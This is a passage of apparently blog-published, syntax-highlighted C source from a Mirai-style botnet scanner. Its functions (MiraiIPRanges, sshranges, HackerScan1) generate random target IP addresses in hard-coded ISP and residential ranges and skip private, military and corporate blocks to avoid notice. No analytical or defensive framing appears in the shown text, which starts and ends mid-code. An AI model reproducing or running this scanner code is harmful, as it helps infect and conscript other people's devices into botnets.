class="keyword">if</span>(randnum == <span class="number">92</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.147.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">93</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.160.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">94</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.161.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">95</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.162.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">96</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.163.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">97</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.168.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">98</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.169.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">99</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.170.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.171.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">101</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;177.172.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">102</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.96.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">103</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.97.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">104</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.98.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">105</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.99.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">106</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;39.34.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">107</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;59.103.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">108</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.12.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">109</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;186.117.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">110</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.131.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">111</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.129.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">112</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.170.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">113</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.206.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">114</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;187.118.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">115</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;187.116.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">116</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.224.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">117</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.166.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> inet_addr(ip);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ipv4_t</span> <span class="title">MiraiIPRanges</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> tmp;</span><br><span class="line">    <span class="keyword">uint8_t</span> o1, o2, o3, o4;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        tmp = rand_cmwc();</span><br><span class="line">        o1 = tmp &amp; <span class="number">0xff</span>;</span><br><span class="line">        o2 = (tmp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">        o3 = (tmp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">        o4 = (tmp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (o1 == <span class="number">127</span> ||                             <span class="comment">// 127.0.0.0/8      - Loopback</span></span><br><span class="line">          (o1 == <span class="number">0</span>) ||                              <span class="comment">// 0.0.0.0/8        - Invalid address space</span></span><br><span class="line">          (o1 == <span class="number">3</span>) ||                              <span class="comment">// 3.0.0.0/8        - General Electric Company</span></span><br><span class="line">          (o1 == <span class="number">15</span> || o1 == <span class="number">16</span>) ||                 <span class="comment">// 15.0.0.0/7       - Hewlett-Packard Company</span></span><br><span class="line">          (o1 == <span class="number">56</span>) ||                             <span class="comment">// 56.0.0.0/8       - US Postal Service</span></span><br><span class="line">          (o1 == <span class="number">10</span>) ||                             <span class="comment">// 10.0.0.0/8       - Internal network</span></span><br><span class="line">          (o1 == <span class="number">192</span> &amp;&amp; o2 == <span class="number">168</span>) ||               <span class="comment">// 192.168.0.0/16   - Internal network</span></span><br><span class="line">          (o1 == <span class="number">172</span> &amp;&amp; o2 &gt;= <span class="number">16</span> &amp;&amp; o2 &lt; <span class="number">32</span>) ||     <span class="comment">// 172.16.0.0/14    - Internal network</span></span><br><span class="line">          (o1 == <span class="number">100</span> &amp;&amp; o2 &gt;= <span class="number">64</span> &amp;&amp; o2 &lt; <span class="number">127</span>) ||    <span class="comment">// 100.64.0.0/10    - IANA NAT reserved</span></span><br><span class="line">          (o1 == <span class="number">169</span> &amp;&amp; o2 &gt; <span class="number">254</span>) ||                <span class="comment">// 169.254.0.0/16   - IANA NAT reserved</span></span><br><span class="line">          (o1 == <span class="number">198</span> &amp;&amp; o2 &gt;= <span class="number">18</span> &amp;&amp; o2 &lt; <span class="number">20</span>) ||     <span class="comment">// 198.18.0.0/15    - IANA Special use</span></span><br><span class="line">          (o1 &gt;= <span class="number">224</span>) ||                            <span class="comment">// 224.*.*.*+       - Multicast</span></span><br><span class="line">          (o1 == <span class="number">6</span> || o1 == <span class="number">7</span> || o1 == <span class="number">11</span> || o1 == <span class="number">21</span> || o1 == <span class="number">22</span> || o1 == <span class="number">26</span> || o1 == <span class="number">28</span> || o1 == <span class="number">29</span> || o1 == <span class="number">30</span> || o1 == <span class="number">33</span> || o1 == <span class="number">55</span> || o1 == <span class="number">214</span> || o1 == <span class="number">215</span>) <span class="comment">// Department of Defense</span></span><br><span class="line">    );</span><br><span class="line"><span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">szprintf(ip, <span class="string">&quot;%d.%d.%d.%d&quot;</span>, o1,  o2, o3, o4);</span><br><span class="line"><span class="keyword">return</span> INET_ADDR(o1,o2,o3,o4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">sshranges</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">ipState[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">0</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">1</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">2</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">3</span>] = rand() % <span class="number">255</span>;</span><br><span class="line"><span class="keyword">int</span> randnum = rand() % <span class="number">40</span>;</span><br><span class="line"><span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;124.105.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.93.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;122.54.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;122.52.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;122.3.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;5.78.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;91.98.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;49.150.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.80.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.81.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.82.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.83.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">12</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.84.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">13</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;191.85.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">14</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;122.3.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;210.213.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;59.69.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">17</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;122.52.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">18</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;122.54.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">19</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.93.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;124.105.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">21</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;125.104.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">22</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.92.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">23</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;119.91.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;49.144.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">25</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.20.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">26</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.30.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">27</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.47.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">28</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.57.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">29</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;12.188.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">30</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;12.34.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">31</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.105.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;179.152.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">33</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.29.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">34</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.32.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">35</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.33.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">36</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.34.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">37</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.35.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">38</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.39.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">39</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.4.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">40</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;189.54.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> inet_addr(ip);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">HackerScan1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">ipState[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">0</span>] = rand() % <span class="number">223</span>;</span><br><span class="line">ipState[<span class="number">1</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">2</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">3</span>] = rand() % <span class="number">255</span>;</span><br><span class="line"><span class="keyword">int</span> randnum = rand() % <span class="number">290</span>;</span><br><span class="line"><span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;112.5.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.165.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;85.3.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.252.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;104.55.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;78.186.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;78.189.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;221.120.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;88.5.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.254.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.20.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.47.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">12</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.57.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">13</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.117.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">14</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;101.51.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;137.59.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.204.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">17</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.50.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">18</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.54.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span 